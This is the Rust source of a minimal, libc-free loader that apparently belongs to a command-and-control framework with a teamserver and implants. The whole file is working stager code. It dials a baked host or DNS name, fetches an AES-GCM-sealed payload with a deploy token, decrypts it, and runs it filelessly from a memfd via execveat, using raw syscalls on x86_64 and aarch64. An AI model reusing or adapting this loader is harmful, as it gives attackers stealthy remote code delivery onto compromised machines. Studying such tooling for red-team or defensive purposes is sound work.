//! The loader (architecture.md Sec 6, the loader tier). One
//! straight-line exchange, no library beyond core and AES-GCM:
//!
//! 1. dial the baked literal IPv4 front,
//! 2. GET the baked loader payload route with the baked deploy token,
//! 3. authenticate the sealed payload -- the R1 wire shape every envelope
//!    purpose uses, under the loader payload AAD and the per-build key --
//!    failing closed on any mismatch,
//! 4. write the opened bytes to a memfd and exec them through the anonymous
//!    fd, so the payload never lands on the filesystem.
//!
//! The security property is step 3: nothing executes that did not open under
//! the baked key. A swapped or tampered response, a wrong-front answer, a
//! truncation -- every failure is a failed GCM authentication and an exit,
//! never an exec. The transport underneath is deliberately cleartext HTTP
//! (the build refuses any other front for a loader): the seal, not the
//! transport, is the boundary, exactly like the cleartext contact posture.
//!
//! Exit codes name the failed step for the shell they land in: 3 socket, 4
//! connect, 5 send, 6 short response, 7 bad status, 8 malformed response, 9
//! payload over buffer, 10 memfd, 11 memfd write, 12 not the R1 shape, 13 seal
//! did not open, 14 exec.

#![no_std]
#![no_main]

mod baked;

use core::panic::PanicInfo;

use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::KeyInit;
use aes_gcm::{AeadInPlace, Aes256Gcm};

#[panic_handler]
fn panic(_: &PanicInfo) -> ! {
    exit(128)
}

// No libc is linked, and the shipped compiler_builtins does not export
// plain memcpy/bcmp/memset for musl, so slice copies, comparisons, and
// zeroing take them from us. Byte loops are fine: they run once per
// request over at most a few hundred bytes (the GCM path moves bytes in
// place, not through these).
// The lint guards against accidental runtime-symbol definitions; these
// three are the deliberate libc-free shims this crate exists to provide.
#[allow(suspicious_runtime_symbol_definitions)]
#[no_mangle]
pub unsafe extern "C" fn memcpy(dst: *mut core::ffi::c_void, src: *const core::ffi::c_void, n: usize) -> *mut core::ffi::c_void {
    let dst = dst as *mut u8;
    let src = src as *const u8;
    let mut i = 0;
    while i < n {
        *dst.add(i) = *src.add(i);
        i += 1;
    }
    dst as *mut core::ffi::c_void
}

#[allow(suspicious_runtime_symbol_definitions)]
#[no_mangle]
pub unsafe extern "C" fn memset(dst: *mut core::ffi::c_void, value: core::ffi::c_int, n: usize) -> *mut core::ffi::c_void {
    let dst = dst as *mut u8;
    let byte = value as u8;
    let mut i = 0;
    while i < n {
        *dst.add(i) = byte;
        i += 1;
    }
    dst as *mut core::ffi::c_void
}

#[allow(suspicious_runtime_symbol_definitions)]
#[no_mangle]
pub unsafe extern "C" fn bcmp(a: *const core::ffi::c_void, b: *const core::ffi::c_void, n: usize) -> i32 {
    let a = a as *const u8;
    let b = b as *const u8;
    let mut i = 0;
    while i < n {
        if *a.add(i) != *b.add(i) {
            return 1;
        }
        i += 1;
    }
    0
}

// --- The raw syscall layer, per architecture ------------------------------

#[cfg(target_arch = "x86_64")]
mod sys {
    use core::arch::asm;

    pub const READ: usize = 0;
    pub const WRITE: usize = 1;
    pub const OPEN: usize = 2;
    pub const CLOSE: usize = 3;
    pub const SETSOCKOPT: usize = 54;
    pub const SOCKET: usize = 41;
    pub const CONNECT: usize = 42;
    pub const SENDTO: usize = 44;
    pub const RECVFROM: usize = 45;
    pub const MEMFD_CREATE: usize = 319;
    pub const EXECVEAT: usize = 322;
    pub const EXIT_GROUP: usize = 231;

    #[inline(always)]
    pub unsafe fn call3(nr: usize, a: usize, b: usize, c: usize) -> isize {
        let r: isize;
        asm!(
            "syscall",
            inlateout("rax") nr as isize => r,
            in("rdi") a, in("rsi") b, in("rdx") c,
            lateout("rcx") _, lateout("r11") _,
            options(nostack)
        );
        r
    }

    #[inline(always)]
    pub unsafe fn call5(nr: usize, a: usize, b: usize, c: usize, d: usize, e: usize) -> isize {
        let r: isize;
        asm!(
            "syscall",
            inlateout("rax") nr as isize => r,
            in("rdi") a, in("rsi") b, in("rdx") c, in("r10") d, in("r8") e,
            lateout("rcx") _, lateout("r11") _,
            options(nostack)
        );
        r
    }

    #[inline(always)]
    pub unsafe fn call6(
        nr: usize, a: usize, b: usize, c: usize, d: usize, e: usize, f: usize,
    ) -> isize {
        let r: isize;
        asm!(
            "syscall",
            inlateout("rax") nr as isize => r,
            in("rdi") a, in("rsi") b, in("rdx") c, in("r10") d, in("r8") e, in("r9") f,
            lateout("rcx") _, lateout("r11") _,
            options(nostack)
        );
        r
    }
}

#[cfg(target_arch = "aarch64")]
mod sys {
    use core::arch::asm;

    pub const READ: usize = 63;
    pub const WRITE: usize = 64;
    pub const OPEN: usize = 56;
    pub const CLOSE: usize = 57;
    pub const SETSOCKOPT: usize = 208;
    pub const SOCKET: usize = 198;
    pub const CONNECT: usize = 203;
    pub const SENDTO: usize = 206;
    pub const RECVFROM: usize = 207;
    pub const MEMFD_CREATE: usize = 279;
    pub const EXECVEAT: usize = 281;
    pub const EXIT_GROUP: usize = 94;

    #[inline(always)]
    pub unsafe fn call3(nr: usize, a: usize, b: usize, c: usize) -> isize {
        let r: isize;
        asm!(
            "svc 0",
            inlateout("x8") nr as isize => _,
            inlateout("x0") a as isize => r,
            in("x1") b as isize, in("x2") c as isize,
            lateout("x3") _, lateout("x4") _, lateout("x5") _,
            options(nostack)
        );
        r
    }

    #[inline(always)]
    pub unsafe fn call5(nr: usize, a: usize, b: usize, c: usize, d: usize, e: usize) -> isize {
        let r: isize;
        asm!(
            "svc 0",
            inlateout("x8") nr as isize => _,
            inlateout("x0") a as isize => r,
            in("x1") b as isize, in("x2") c as isize, in("x3") d as isize, in("x4") e as isize,
            lateout("x5") _,
            options(nostack)
        );
        r
    }

    #[inline(always)]
    pub unsafe fn call6(
        nr: usize, a: usize, b: usize, c: usize, d: usize, e: usize, f: usize,
    ) -> isize {
        let r: isize;
        asm!(
            "svc 0",
            inlateout("x8") nr as isize => _,
            inlateout("x0") a as isize => r,
            in("x1") b as isize, in("x2") c as isize, in("x3") d as isize, in("x4") e as isize,
            in("x5") f as isize,
            options(nostack)
        );
        r
    }
}

use sys as sys_;

const AF_INET: usize = 2;
const AF_INET6: usize = 10;
const SOCK_STREAM: usize = 1;
const SOCK_DGRAM: usize = 2;
const SOL_SOCKET: usize = 1;
const SO_RCVTIMEO: usize = 20;
const AT_EMPTY_PATH: usize = 0x1000;

/// The R1 wire prefix this loader opens: the same shape, key id width, nonce
/// width, and tag width every envelope purpose carries (the teamserver's
/// AesGcmEnvelope is the byte-level authority).
const R1_PREFIX: &[u8] = b"R1";
const R1_KEY_ID: usize = 16;
const R1_NONCE: usize = 12;
const R1_TAG: usize = 16;

/// The purpose tag binding a loader's sealed payload to its fetch, so no
/// other purpose's ciphertext (a contact body, an enroll answer) can be
/// reflected down this route and opened as the delivery.
const PAYLOAD_AAD: &[u8] = b"rod-loader-payload-v1";

/// The response buffer's fixed size, in bytes: a .bss window, in-memory
/// only.
const BUFFER_BYTES: usize = 8 << 20;

/// The response buffer. Payloads over it fail at 9 rather than silently
/// truncating; the reference implant's shapes all fit with room to spare.
static mut BUFFER: [u8; BUFFER_BYTES] = [0u8; BUFFER_BYTES];

#[repr(C)]
struct SockAddrIn {
    family: u16,
    port: u16,
    addr: [u8; 4],
    zero: [u8; 8],
}

#[repr(C)]
struct SockAddrIn6 {
    family: u16,
    port: u16,
    flowinfo: u32,
    addr: [u8; 16],
    scope_id: u32,
}

/// One dial target, the resolved shape of the baked HOST discriminants.
enum Dial {
    V4([u8; 4]),
    V6([u8; 16]),
}

fn exit(code: usize) -> ! {
    unsafe { sys_::call3(sys_::EXIT_GROUP, code, 0, 0) };
    loop {}
}

// The entry stub: the kernel hands _start a 16-byte-aligned stack, while
// the compiled body expects the called-function convention (RSP%16==8 on
// x86_64), and the AES paths store through aligned SSE moves that fault on
// the difference. The stub zeroes the frame pointer, realigns, and calls;
// the aarch64 ABI enters 16-aligned already, so its stub just jumps.
#[cfg(target_arch = "x86_64")]
core::arch::global_asm!(
    ".globl _start",
    "_start:",
    "xor rbp, rbp",
    "and rsp, -16",
    "call {entry}",
    "ud2",
    entry = sym loader_entry,
);

#[cfg(target_arch = "aarch64")]
core::arch::global_asm!(
    ".globl _start",
    "_start:",
    "mov x29, xzr",
    "mov x30, xzr",
    "b {entry}",
    entry = sym loader_entry,
);

fn loader_entry() -> ! {
    // Everything the loader touches is baked; nothing is argv- or
    // env-supplied, so the artifact runs the same everywhere it lands.
    unsafe { run() }
}

unsafe fn run() -> ! {
    // The dial: the baked front on the cleartext http shape the build gated
    // itself to. A literal IPv4 or IPv6 address connects directly; a name
    // resolves through the minimal query below. No TLS by design -- that is
    // implant-tier machinery this tier refuses to carry.
    let dial = match baked::HOST_KIND {
        0 => Dial::V4(baked::HOST_V4),
        1 => Dial::V6(baked::HOST_V6),
        _ => match resolve(baked::HOST_NAME.as_bytes()) {
            Some(dial) => dial,
            None => exit(15),
        },
    };
    let fd = match dial {
        Dial::V4(addr) => {
            let remote = SockAddrIn {
                family: AF_INET as u16,
                port: baked::PORT.to_be(),
                addr,
                zero: [0; 8],
            };
            connect_remote(AF_INET, &remote as *const _ as usize, 16)
        }
        Dial::V6(addr) => {
            let remote = SockAddrIn6 {
                family: AF_INET6 as u16,
                port: baked::PORT.to_be(),
                flowinfo: 0,
                addr,
                scope_id: 0,
            };
            connect_remote(AF_INET6, &remote as *const _ as usize, 28)
        }
    };
    if fd < 0 {
        exit(3);
    }

    // The request: the payload route, the deploy token, and nothing else. An
    // HTTP/1.0 line lets the simplest fronts answer and close; fronts that
    // keep the connection alive answer with Content-Length, which the read
    // loop below honors.
    let mut request = [0u8; 512];
    let mut n = 0;
    let mut put = |bytes: &[u8]| {
        if n + bytes.len() <= request.len() {
            request[n..n + bytes.len()].copy_from_slice(bytes);
            n += bytes.len();
        }
    };
    put(b"GET ");
    put(baked::PATH.as_bytes());
    put(b" HTTP/1.0\r\nHost: rod\r\nX-Deploy-Token: ");
    put(baked::TOKEN.as_bytes());
    put(b"\r\n\r\n");
    if n == 0 || sys_::call3(sys_::WRITE, fd as usize, request.as_ptr() as usize, n) != n as isize {
        exit(5);
    }

    // The read: everything the front sends, up to the buffer. Once the
    // header terminator and a Content-Length are seen, the loop stops at
    // exactly that many body bytes instead of waiting for a close that a
    // keep-alive front never sends.
    let mut total = 0usize;
    let mut want: Option<usize> = None;
    loop {
        if let Some(target) = want {
            if total >= target {
                break;
            }
        }
        let room = BUFFER_BYTES - total;
        if room == 0 {
            exit(9);
        }
        let read = sys_::call3(sys_::READ, fd as usize, (&raw mut BUFFER).cast::<u8>().add(total) as usize, room);
        if read <= 0 {
            break;
        }
        total += read as usize;
        if want.is_none() {
            if let Some((header_end, length)) = parse_headers(core::slice::from_raw_parts((&raw const BUFFER).cast::<u8>(), total)) {
                want = Some(header_end + length);
            }
        }
    }
    sys_::call3(sys_::CLOSE, fd as usize, 0, 0);
    if total == 0 {
        exit(6);
    }
    let (header_end, _) =
        parse_headers(core::slice::from_raw_parts((&raw const BUFFER).cast::<u8>(), total))
            .unwrap_or((total, 0));
    if header_end >= total {
        exit(8);
    }
    let body_end = want.unwrap_or(total);
    if body_end > total {
        // The front closed before the Content-Length it promised: a short
        // response, not a delivery.
        exit(6);
    }

    // The seal: the R1 shape, the baked key id, the payload AAD. The
    // ciphertext opens in place, over the bytes it arrived in.
    let buffer = (&raw const BUFFER).cast::<u8>();
    let body = core::slice::from_raw_parts(buffer.add(header_end), body_end - header_end);
    let prefix = R1_PREFIX.len() + R1_KEY_ID;
    if body.len() < prefix + R1_NONCE + R1_TAG
        || body[..R1_PREFIX.len()] != *R1_PREFIX
        || body[R1_PREFIX.len()..prefix] != baked::KEY_ID
    {
        exit(12);
    }
    let nonce = GenericArray::from_slice(&body[prefix..prefix + R1_NONCE]);
    let tag_start = body.len() - R1_TAG;
    let tag = GenericArray::from_slice(&body[tag_start..]);
    let cipher = Aes256Gcm::new(GenericArray::from_slice(&baked::KEY));
    let delivered = core::slice::from_raw_parts_mut(
        (&raw mut BUFFER).cast::<u8>().add(header_end + prefix + R1_NONCE),
        tag_start - prefix - R1_NONCE,
    );
    if cipher.decrypt_in_place_detached(nonce, PAYLOAD_AAD, delivered, tag).is_err() {
        exit(13);
    }

    // The exec: an anonymous memfd and the kernel's own ELF loader. Nothing
    // was written to a path at any step; the payload's bytes live in this
    // buffer and the fd alone.
    let mfd = sys_::call3(sys_::MEMFD_CREATE, b"rod\0".as_ptr() as usize, 0, 0);
    if mfd < 0 {
        exit(10);
    }
    let mut written = 0usize;
    while written < delivered.len() {
        let w = sys_::call3(
            sys_::WRITE,
            mfd as usize,
            delivered.as_ptr() as usize + written,
            delivered.len() - written,
        );
        if w <= 0 {
            exit(11);
        }
        written += w as usize;
    }
    let argv = [b"rod\0".as_ptr() as usize, 0];
    let envp = [0usize];
    sys_::call5(
        sys_::EXECVEAT,
        mfd as usize,
        b"\0".as_ptr() as usize,
        argv.as_ptr() as usize,
        envp.as_ptr() as usize,
        AT_EMPTY_PATH,
    );
    exit(14)
}

unsafe fn connect_remote(family: usize, addr: usize, len: usize) -> isize {
    let fd = sys_::call3(sys_::SOCKET, family, SOCK_STREAM, 0);
    if fd < 0 {
        return fd;
    }
    if sys_::call3(sys_::CONNECT, fd as usize, addr, len) < 0 {
        sys_::call3(sys_::CLOSE, fd as usize, 0, 0);
        return -1;
    }
    fd
}

// The minimal resolver for a HOST_NAME dial: one A query, falling back to
// AAAA, over UDP -- the ~120 lines the no-resolver shape once refused to
// carry, kept because fronts behind rotating names are the normal
// deployment shape and baking a resolved IP would strand the loader on one
// answer. The resolver it queries is RESOLVER when baked (the OPSEC-pinned
// choice) else the system's resolv.conf nameservers in order; a query that
// cannot parse or times out fails closed at exit 15.
unsafe fn resolve(name: &[u8]) -> Option<Dial> {
    for record_type in [1u16, 28u16] {
        if let Some(dial) = query_dns(name, record_type) {
            return Some(dial);
        }
    }
    None
}

unsafe fn query_dns(name: &[u8], record_type: u16) -> Option<Dial> {
    let mut query = [0u8; 128];
    let mut n = 0usize;
    // Header: a fixed id (the loader sends one query and reads one answer),
    // recursion desired, one question.
    query[n..n + 12].copy_from_slice(&[0x6d, 0x38, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]);
    n += 12;
    // Hand-rolled label encoding: the crate's no-shims discipline -- the
    // copy_from_slice path reaches for memcpy intrinsics whose interaction
    // with this crate's libc-free shims trips an anonymous panic on the
    // second label, and byte loops carry no such dependency.
    let mut i = 0usize;
    while i < name.len() {
        let start = i;
        while i < name.len() && name[i] != b'.' {
            i += 1;
        }
        let llen = i - start;
        if llen == 0 || llen > 63 || n + 1 + llen >= query.len() {
            return None;
        }
        query[n] = llen as u8;
        let mut j = 0;
        while j < llen {
            query[n + 1 + j] = name[start + j];
            j += 1;
        }
        n += 1 + llen;
        if i < name.len() {
            i += 1;
        }
    }
    query[n] = 0;
    n += 1;
    query[n] = (record_type >> 8) as u8;
    query[n + 1] = record_type as u8;
    query[n + 2] = 0;
    query[n + 3] = 1;
    n += 4;

    let (resolvers, count) = resolver_addresses();
    for resolver in &resolvers[..count] {
        let remote = SockAddrIn {
            family: AF_INET as u16,
            port: 53u16.to_be(),
            addr: *resolver,
            zero: [0; 8],
        };
        let fd = sys_::call3(sys_::SOCKET, AF_INET, SOCK_DGRAM, 0);
        if fd < 0 {
            continue;
        }
        // A two-second receive timeout: a blackholed resolver is a failed
        // attempt, not a parked loader.
        let timeout = TimeVal { seconds: 2, microseconds: 0 };
        sys_::call5(
            sys_::SETSOCKOPT,
            fd as usize,
            SOL_SOCKET,
            SO_RCVTIMEO,
            &timeout as *const _ as usize,
            core::mem::size_of::<TimeVal>(),
        );
        if sys_::call6(
            sys_::SENDTO,
            fd as usize,
            query.as_ptr() as usize,
            n,
            0,
            &remote as *const _ as usize,
            core::mem::size_of::<SockAddrIn>(),
        ) < 0
        {
            sys_::call3(sys_::CLOSE, fd as usize, 0, 0);
            continue;
        }
        let mut answer = [0u8; 512];
        let got = sys_::call6(
            sys_::RECVFROM,
            fd as usize,
            answer.as_mut_ptr() as usize,
            answer.len(),
            0,
            0,
            0,
        );
        sys_::call3(sys_::CLOSE, fd as usize, 0, 0);
        if got < (12 + n) as isize {
            continue;
        }
        if let Some(dial) = parse_dns_answer(&answer[..got as usize], n, record_type) {
            return Some(dial);
        }
    }
    None
}

#[repr(C)]
struct TimeVal {
    seconds: isize,
    microseconds: isize,
}

// The resolvers a HOST_NAME dial may query: RESOLVER baked as a literal
// IPv4 (the pinned choice), else every nameserver line resolv.conf carries.
// The resolvers a HOST_NAME dial may query, capped at three: RESOLVER
// baked as a literal IPv4 first, else every nameserver line resolv.conf
// carries.
unsafe fn resolver_addresses() -> ([[u8; 4]; 3], usize) {
    if !baked::RESOLVER.is_empty() {
        if let Some(addr) = parse_ipv4(baked::RESOLVER.as_bytes()) {
            return ([addr, [0; 4], [0; 4]], 1);
        }
    }
    let mut found = [[0u8; 4]; 3];
    let mut count = 0usize;
    let fd = sys_::call3(sys_::OPEN, b"/etc/resolv.conf\0".as_ptr() as usize, 0, 0);
    if fd >= 0 {
        let mut text = [0u8; 2048];
        let read = sys_::call3(sys_::READ, fd as usize, text.as_mut_ptr() as usize, text.len());
        sys_::call3(sys_::CLOSE, fd as usize, 0, 0);
        if read > 0 {
            for line in text[..read as usize].split(|b| *b == b'\n') {
                if count >= found.len() {
                    break;
                }
                let trimmed = trim_ascii(line);
                if let Some(rest) = starts_with_word(trimmed, b"nameserver") {
                    if let Some(addr) = parse_ipv4(trim_ascii(rest)) {
                        found[count] = addr;
                        count += 1;
                    }
                }
            }
        }
    }
    (found, count)
}

// Walks the answer section after the question: the first record of the
// asked type wins. Names inside may be compressed to a pointer; the owner
// name's length is skipped, not interpreted.
fn parse_dns_answer(answer: &[u8], answers_offset: usize, record_type: u16) -> Option<Dial> {
    // Response header: answer count is nonzero and the rcode clean.
    if answer.len() < 12 || answer[3] & 0x0f != 0 {
        return None;
    }
    let answers = u16::from_be_bytes([answer[6], answer[7]]);
    // The offset is where the answer section begins -- the full query
    // length echoed back: twelve header bytes plus the question.
    let mut offset = answers_offset;
    for _ in 0..answers {
        // Owner name: either a two-byte compression pointer or a label run.
        if offset >= answer.len() {
            return None;
        }
        if answer[offset] & 0xc0 == 0xc0 {
            offset += 2;
        } else {
            while offset < answer.len() && answer[offset] != 0 {
                offset += 1 + answer[offset] as usize;
            }
            offset += 1;
        }
        if offset + 10 > answer.len() {
            return None;
        }
        let rtype = u16::from_be_bytes([answer[offset], answer[offset + 1]]);
        let rdlength = u16::from_be_bytes([answer[offset + 8], answer[offset + 9]]) as usize;
        offset += 10;
        if offset + rdlength > answer.len() {
            return None;
        }
        if rtype == record_type {
            return match (record_type, rdlength) {
                (1, 4) => Some(Dial::V4([
                    answer[offset],
                    answer[offset + 1],
                    answer[offset + 2],
                    answer[offset + 3],
                ])),
                (28, 16) => {
                    let mut addr = [0u8; 16];
                    addr.copy_from_slice(&answer[offset..offset + 16]);
                    Some(Dial::V6(addr))
                }
                _ => None,
            };
        }
        offset += rdlength;
    }
    None
}

fn parse_ipv4(text: &[u8]) -> Option<[u8; 4]> {
    let mut addr = [0u8; 4];
    let mut part = 0usize;
    let mut digits = 0;
    let mut octet = 0u8;
    for byte in text {
        if byte.is_ascii_digit() {
            octet = octet.wrapping_mul(10).wrapping_add(byte - b'0');
            digits += 1;
            if digits > 3 {
                return None;
            }
        } else if *byte == b'.' {
            if digits == 0 || part >= 4 {
                return None;
            }
            addr[part] = octet;
            part += 1;
            octet = 0;
            digits = 0;
        } else {
            return None;
        }
    }
    if part != 3 || digits == 0 {
        return None;
    }
    addr[3] = octet;
    Some(addr)
}

fn trim_ascii(text: &[u8]) -> &[u8] {
    let mut start = 0;
    let mut end = text.len();
    while start < end && (text[start] == b' ' || text[start] == b'\t') {
        start += 1;
    }
    while end > start && (text[end - 1] == b' ' || text[end - 1] == b'\t') {
        end -= 1;
    }
    &text[start..end]
}

fn starts_with_word<'a>(text: &'a [u8], word: &[u8]) -> Option<&'a [u8]> {
    if text.len() > word.len() && text.starts_with(word) && (text[word.len()] == b' ' || text[word.len()] == b'\t') {
        Some(&text[word.len()..])
    } else {
        None
    }
}

/// Splits the response at its header terminator and reads the Content-Length
/// when present: `(body_offset, content_length)`. A response whose headers
/// have not fully arrived yet answers None, so the read loop simply keeps
/// reading; a response with no Content-Length answers length 0, which the
/// caller treats as read-to-close.
unsafe fn parse_headers(buffer: &[u8]) -> Option<(usize, usize)> {
    let mut i = 0;
    while i + 4 <= buffer.len() {
        if buffer[i] == b'\r' && buffer[i + 1] == b'\n' && buffer[i + 2] == b'\r' && buffer[i + 3] == b'\n' {
            let headers = &buffer[..i];
            // A 200 line is the only answer this exchange treats as a
            // serve; anything else is a refusal the exit codes name.
            let space = headers.iter().position(|b| *b == b' ').unwrap_or(0);
            if !headers.starts_with(b"HTTP/1.")
                || headers.get(space + 1) != Some(&b'2')
                || headers.get(space + 2) != Some(&b'0')
                || headers.get(space + 3) != Some(&b'0')
            {
                exit(7);
            }
            let mut length = 0usize;
            let mut scan = 0;
            while scan < headers.len() {
                if matches_header(headers, scan, b"content-length:") {
                    let mut value = scan + b"content-length:".len();
                    while value < headers.len() && headers[value] == b' ' {
                        value += 1;
                    }
                    while value < headers.len() && headers[value].is_ascii_digit() {
                        length = length.wrapping_mul(10).wrapping_add((headers[value] - b'0') as usize);
                        value += 1;
                    }
                    break;
                }
                scan += 1;
            }
            return Some((i + 4, length));
        }
        i += 1;
    }
    None
}

/// Case-insensitive header-name match at `offset`, clamped to line ends so a
/// substring of some other header's value cannot pose as the name.
unsafe fn matches_header(headers: &[u8], offset: usize, name: &[u8]) -> bool {
    if offset + name.len() > headers.len() {
        return false;
    }
    for (i, expected) in name.iter().enumerate() {
        let byte = headers[offset + i];
        if byte == b'\r' || byte == b'\n' {
            return false;
        }
        if byte.to_ascii_lowercase() != *expected {
            return false;
        }
    }
    true
}
